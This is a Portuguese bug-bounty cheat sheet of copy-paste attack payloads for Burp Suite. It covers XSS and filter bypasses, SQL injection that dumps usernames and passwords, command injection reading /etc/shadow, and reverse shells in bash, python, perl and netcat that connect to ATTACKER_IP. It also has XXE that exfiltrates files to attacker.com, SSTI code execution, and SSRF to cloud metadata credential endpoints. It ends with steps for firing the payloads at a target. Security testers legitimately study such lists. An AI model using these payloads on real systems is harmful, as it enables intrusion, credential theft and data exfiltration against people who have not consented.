# 💾 PAYLOAD DATABASE - Centenas de Payloads Prontos para Copiar-Colar

Copy-paste direto no Burp Suite!

---

# XSS (Cross-Site Scripting) - 50+ Payloads

## XSS Básico (Reflected)

```
<script>alert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src="x" onerror="alert('XSS')">
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
<video><source onerror="alert('XSS')">
<audio src=x onerror=alert('XSS')>
<iframe srcdoc="<script>alert('XSS')</script>">
```

## XSS DOM-based

```
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
vbscript:alert('XSS')
```

## XSS com Filtros (Bypass)

```
<scr<script>ipt>alert('XSS')</script>
<script>alert('XSS')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
<<script>script>alert('XSS')<</script>/script>
<script>/**/alert('XSS')</script>
<script>al/**/ert('XSS')</script>
<img src=x onerror=alert`XSS`>
<img src=x onerror=alert(1)>
```

## XSS em Atributo HTML

```
" onmouseover="alert('XSS')
" onload="alert('XSS')
' onclick='alert("XSS")
" onfocus="alert('XSS')
" onkeypress="alert('XSS')
```

## XSS Event Handler Completo

```
onabort
onactivate
onafterupdate
onafterupdate
onbeforeactivate
onbeforecopy
onbeforecut
onbeforedeactivate
onbeforeeditfocus
onbeforepaste
onbeforeunload
onbeginEvent
onblur
onbounce
oncellchange
onchange
onclick
oncontextmenu
oncontrolselect
oncopy
oncutstart
ondataavailable
ondatasetchanged
ondatasetcomplete
ondblclick
ondeactivate
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
onerror
onerrorupdate
onfilterchange
onfinish
onfocus
onfocusin
onfocusout
onhelp
onkeydown
onkeypress
onkeyup
onlayoutcomplete
onload
onlosecapture
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onmove
onmoveend
onmovestart
onpaste
onpause
onplay
onplayerror
onplaying
onpropertychange
onreadystatechange
onrepeat
onreset
onresize
onresizeend
onresizestart
onrowexit
onrowsinserted
onrowsdelete
onscroll
onseek
onselect
onselectionchange
onselectstart
onstart
onstop
onsubmit
ontimeupdate
ontrackchange
onunload
```

---

# SQL INJECTION - 40+ Payloads

## SQLi Básico

```
'
"
;
')
";
');
")
');
```

## SQLi Teste

```
' OR '1'='1
' OR 1=1 --
' OR 'x'='x
admin'--
' OR 'a'='a
') OR ('1'='1
" OR "1"="1
' OR 1=1;--
```

## UNION-based SQLi

```
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT NULL,NULL,NULL,NULL --
' UNION SELECT NULL,NULL,NULL,NULL,NULL --

' UNION SELECT @@version --
' UNION SELECT database() --
' UNION SELECT user() --
' UNION SELECT username,password FROM users --
' UNION SELECT version(),user(),database() --
```

## Extração de Dados

```
' UNION SELECT table_name FROM information_schema.tables --
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT GROUP_CONCAT(username,':',password) FROM users --
' UNION SELECT load_file('/etc/passwd') --
' UNION SELECT @@datadir --
' UNION SELECT @@basedir --
' UNION SELECT @@version_compile_os --
```

## Time-based Blind SQLi

```
' AND SLEEP(5) --
' AND IF(1=1, SLEEP(5), 0) --
' AND BENCHMARK(1000000, MD5('a')) --
admin' AND 1=SLEEP(5) --
' OR 1=1 WAITFOR DELAY '00:00:05' --
```

## Erro-based SQLi

```
' AND extractvalue(1, concat(0x7e, database())) --
' AND extractvalue(1, concat(0x7e, version())) --
' AND updatexml(1, concat(0x7e, database()), 1) --
' UNION SELECT 1, extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(username) FROM users))) --
```

## Bypass de Filtro

```
' /*!50000UNION*/ SELECT NULL --
' %55NION %53ELECT NULL --
' un/**/ion se/**/lect NULL --
' unUnIoN sElEcT NULL --
' UNION/**/SELECT NULL --
' /*!20000UNION*/ /*!20000SELECT*/ NULL --
```

---

# Command Injection - 30+ Payloads

## Linux/Unix

```
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)
```

## Concatenação

```
; whoami
; id
; pwd
; cat /etc/passwd
; cat /etc/shadow
; ls -la
; find / -name "*.txt"
```

## Reverse Shell

```
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

python -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER_IP",PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};'

nc -e /bin/sh ATTACKER_IP PORT
nc -l -p PORT -e /bin/sh
```

---

# XXE (XML External Entity) - 25+ Payloads

## XXE Básico - Leitura de Arquivo

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## XXE Blind (Out-of-Band)

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>test</foo>
```

Evil.dtd no servidor attacker:
```
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>
%send;">
%all;
```

## Billion Laughs DoS

```
<?xml version="1.0"?>
<!DOCTYPE lol [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lol>&lol4;</lol>
```

## SSRF via XXE

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<foo>&xxe;</foo>
```

---

# SSTI (Server-Side Template Injection) - 30+ Payloads

## Jinja2/Flask

```
{{ 7 * 7 }}
{{ config }}
{{ config.SECRET_KEY }}
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ self.__dict__.keys() }}
```

## Django

```
{{ 7 * 7 }}
{% for item in ().__class__.__bases__[0].__subclasses__() %}{% if "Popen" in item.__name__ %}
{{ item('id',shell=True,stdout=-1).communicate() }}{% endif %}{% endfor %}
```

## Velocity

```
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
$rt.getRuntime().exec('whoami')
```

## Freemarker

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

## SSTI Bypass

```
{{ config|attr('__class__') }}
{{ ''['__class__']['__bases__'][0]['__subclasses__']()[396]('ls',shell=True,stdout=-1)['communicate']() }}
${7*7}
<%= 7*7 %>
```

---

# LDAP Injection - 15+ Payloads

## LDAP Auth Bypass

```
*
admin*
*)(uid=*))(|(uid=*
admin)(|(uid=*
*)(objectClass=*
admin*)(|(cn=*
```

## Busca LDAP

```
*
*))(|(cn=*
*)(|(uid=*
*
*)(mail=*
*
```

---

# SSRF (Server-Side Request Forgery) - 20+ Payloads

## SSRF Básico

```
http://localhost:8080
http://127.0.0.1:8080
http://127.1
http://0.0.0.0
http://169.254.169.254
```

## AWS Metadata (EC2)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
http://169.254.169.254/latest/user-data/
```

## Azure Metadata

```
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/v1/instance
```

## GCP Metadata

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## SSRF Bypass

```
http://localhost.localdomain
http://127.0.0.1.nip.io
http://0.0.0.0
http://[::1]
http://127.0.0.1%00.example.com
```

---

# Wordlists Úteis

## Nomes de Admin

```
admin
administrator
root
superuser
sysadmin
sys-admin
operator
webmaster
moderator
```

## Extensões Comuns

```
.php
.asp
.aspx
.jsp
.do
.py
.rb
.pl
.cgi
.html
.htm
.xml
.json
```

## Paths Sensíveis

```
/admin
/administrator
/login
/admin/login
/cpanel
/phpmyadmin
/wp-admin
/wp-login
/api/admin
/api/users
/api/config
/.env
/.git
/.svn
/.DS_Store
/web.config
/config.php
/database.php
/backup
/backup.zip
```

---

## 📋 COMO USAR

1. **Copie payload acima**
2. **Cole em Burp Repeater**
3. **Modifique para seu alvo**
4. **Clique [Send]**
5. **Analise resultado**

**Dica:** Use Intruder com múltiplos payloads para testar vários ao mesmo tempo!

---

**Próximo:** Volte para [BUG-BOUNTY-MASTER-README](./BUG-BOUNTY-MASTER-README.md)

